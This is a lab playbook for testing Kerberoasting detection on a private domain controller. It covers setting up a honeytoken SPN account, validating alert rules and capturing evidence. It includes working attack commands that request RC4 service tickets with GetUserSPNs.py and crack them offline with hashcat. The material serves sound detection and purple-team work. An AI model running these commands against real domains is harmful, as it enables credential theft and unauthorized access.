# Playbook 03 — Kerberoasting (T1558.003)

**Goal:** request RC4 service tickets for an SPN account from Kali and fire
rule **100210** (single RC4 ticket) and, on enumeration, **100211** (5+
services in 60 s).

| | |
|---|---|
| Technique | T1558.003 — Steal or Forge Kerberos Tickets: Kerberoasting |
| Source | Kali `192.168.56.103` |
| Target | DC01 `192.168.56.10`, service account(s) with an SPN |
| Windows event | 4769 with `TicketEncryptionType 0x17` (RC4) |
| Detection | **100210** → **100211** |

## 1. Create the honeytoken SPN account (on DC01)

Kerberoasting needs at least one account with an SPN. Create a deliberately
weak **honeytoken** so any ticket request for it is suspicious by definition:

```powershell
# Run on DC01 as Domain Admin — see scripts/New-KerberoastHoneytoken.ps1
.\scripts\New-KerberoastHoneytoken.ps1 -SamAccountName svc-sql `
    -Spn 'MSSQLSvc/dc01.lab.local:1433'
```

The script creates the account, sets the SPN, and (optionally) a weak
password so you can prove the offline-cracking step end to end.

## 2. Enumerate and roast from Kali

Any valid domain credential can request service tickets:

```bash
# List SPN accounts and request their tickets (RC4) in one step
GetUserSPNs.py lab.local/jdoe:'<password>' -dc-ip 192.168.56.10 -request \
    -outputfile roasted.txt
```

Each `-request` produces a **4769** on the DC. `GetUserSPNs.py` requests RC4
(`0x17`) by default, which is exactly what rule 100210 matches.

For the burst that trips **100211**, create several SPN accounts (re-run the
script with different `-SamAccountName`/`-Spn`) so one `GetUserSPNs.py` run
requests 5+ RC4 tickets within 60 s.

## 3. (Optional) crack offline — shows why RC4 matters

```bash
hashcat -m 13100 roasted.txt /usr/share/wordlists/rockyou.txt
```

A weak honeytoken password cracks in seconds; document the time-to-crack as
the business impact.

## 4. Validate

```bash
sudo jq -c 'select(.rule.id=="100210" or .rule.id=="100211")
            | {t:.timestamp, rule:.rule.id, level:.rule.level,
               svc:.data.win.eventdata.serviceName,
               enc:.data.win.eventdata.ticketEncryptionType,
               src:.data.win.eventdata.ipAddress}' \
     /var/ossec/logs/alerts/alerts.json
```

Expected: `100210` level 8 per ticket; `100211` level 12 on the burst; `enc =
0x17`.

> **Tuning note.** Normal RC4 traffic from legacy clients produces 100210
> too. In a hardened domain you would alert only on 100211 (the burst) or
> whitelist known legacy SPNs. In this lab, where no legitimate RC4 is
> expected, 100210 alone is already meaningful.

## 5. Capture evidence

- `alerts.json` lines → [`../../samples/4769-kerberoasting.json`](../../samples/).
- `GetUserSPNs.py` output + hashcat crack → screenshot in `../img/`.
- Flip T1558.003 to ✅ in [`../mitre_attack_mapping.md`](../mitre_attack_mapping.md).
